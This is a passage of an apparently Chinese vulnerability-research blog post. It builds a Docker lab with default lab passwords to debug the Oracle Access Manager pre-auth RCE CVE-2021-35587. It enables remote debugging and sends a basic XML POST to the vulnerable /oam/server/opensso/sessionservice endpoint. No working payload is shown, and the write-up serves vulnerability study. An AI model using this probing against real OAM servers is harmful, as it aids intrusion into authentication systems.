</span></span><span style=display:flex><span>docker run -d --network<span style=color:#f92672>=</span>OamNET -p 8452:8453 -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span><span style=display:flex><span>docker run -d -p 14100:14100 -p 8453:8453 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>14100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_server1 --env MS_HOST<span style=color:#f92672>=</span>oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span><span style=display:flex><span>docker run -d -p 15100:15100 -p 8454:8453 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>15100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_policy_mgr1 --env MS_HOST<span style=color:#f92672>=</span>oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div><ol start=2><li>修改oamms容器中的<code>/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh</code> 文件，在debugFlag变量被使用之前将其赋值为true。大约是在第419行这个空白行添加 <code>debugFlag="true"</code> 。</li><li>重启oamms容器： <code>docker restart oamms</code></li><li>将oamms容器中的 <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/*.jar</code> 和 <code>/u01/oracle/coherence/lib/*.jar</code> 下载到调试主机，添加到调试项目的library中。</li><li>在oamms容器中生成 wlfullclient.jar ，下载到调试主机，添加到调试项目的library中。</li><li>通过 <code>docker exec oamms tail -f /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log</code> 查看错误日志
idea启动调试
在 <code>oracle.security.am.pbl.transport.http.AMServlet#doPost</code> 下断点
通过 <code>curl -XPOST http://192.168.175.139:14100/oam/server/opensso/sessionservice</code> 发送请求
这个时候idea就能成功捕获到断点了。</li></ol><h2 id=需要关注的容器和进程>①需要关注的容器和进程<a hidden class=anchor aria-hidden=true href=#需要关注的容器和进程>#</a></h2><p>由漏洞作者<a href=https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316>分析文章</a>知道存在漏洞的接口为 <code>/oam/server/opensso/sessionservice</code> ，结合OAM搭建文档的<a href=https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#ValidatingtheOAMServices>服务验证环节</a>，知道是oamms容器expose的14100端口上web应用的问题，故尝试调试该容器的web应用。</p><p>修改oamms容器中的<code>/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh</code> 文件以将oamms中Java进程切换到可调试模式。方便我们通过idea挂载到oamms中对存在漏洞的Java进程进行远程调试。</p><p>在空白行419行添加<code>debugFlag="true"</code> 。容器中没有vim , ps , netstat 等工具，可以使用 <code>yum install vim net-tools</code> 进行安装。</p><p><img loading=lazy src=image-20220322162630044.png alt=image-20220322162630044></p><p>然后执行<code>docker restart oamms</code>，重启完成后进入容器可以看到进程已经以调试模式启动，并且监听在8453端口。</p><p><img loading=lazy src=image-20220322163027854.png alt=image-20220322163027854></p><p>但是<strong>此时oamms容器中的8453端口并没有expose出来</strong>。</p><p>尝试通过将当前oamms容器保存为镜像，再重新启动的方式来添加映射端口：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker stop oamms
</span></span><span style=display:flex><span>docker commit oamms myoamms-image
</span></span><span style=display:flex><span>docker container rm oamms 
</span></span><span style=display:flex><span>docker run -itd -name oamms -p 8453:8453 -p 14100:14100 myoamms-image
</span></span><span style=display:flex><span>docker run -itd -n oamms -p 8453:8453 -p 14100:14100 myoamms-image
</span></span><span style=display:flex><span>docker run -itd --name oamms -p 8453:8453 -p 14100:14100 myoamms-image
</span></span></code></pre></td></tr></table></div></div><p>但似乎没有成功，界面一直停留在 <code>Waiting for WebLogic Admin Server on oamadmin/7001 to become available...</code> ，可能是新建的容器IP变动导致的网络通信的问题。</p><p><img loading=lazy src=image-20220322170915415.png alt=image-20220322170915415></p><p>干脆重新部署，在新建各个容器的时候添加映射端口。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1
</span></span><span style=display:flex><span>docker run -d --network<span style=color:#f92672>=</span>OamNET -p 8452:8453 -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span><span style=display:flex><span>docker run -d -p 14100:14100 -p 8453:8453 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>14100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_server1 --env MS_HOST<span style=color:#f92672>=</span>oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span><span style=display:flex><span>docker run -d -p 15100:15100 -p 8454:8453 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>15100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_policy_mgr1 --env MS_HOST<span style=color:#f92672>=</span>oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>重新部署后按照上述修改<code>/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh</code> 后重启oamms容器，将oamms改成调试模式启动。</p><h2 id=监控web应用日志>②监控web应用日志<a hidden class=anchor aria-hidden=true href=#监控web应用日志>#</a></h2><p>从<code>docker logs -f oamms</code> 可以看到oamms的web应用日志在<code>/u01/oracle/user_projects/domains/access_domain/logs/</code>这个文件夹中，访问应用时最新出现改变的文件是<code>oam_server1-ms-oamms.log</code>。</p><p>因此执行</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker exec oamms tail -f  /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log
</span></span></code></pre></td></tr></table></div></div><h2 id=向漏洞接口发送基本请求>③向漏洞接口发送基本请求<a hidden class=anchor aria-hidden=true href=#向漏洞接口发送基本请求>#</a></h2><p>参考漏洞作者<a href=https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316>分析文章</a> ，向OAMMS发送一个 <code>/oam/server/opensso/sessionservice</code> 所能接受和处理的基本请求</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 294
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;YWJjZA==&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>看到日志中的报错调用栈为</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-41>41</a>
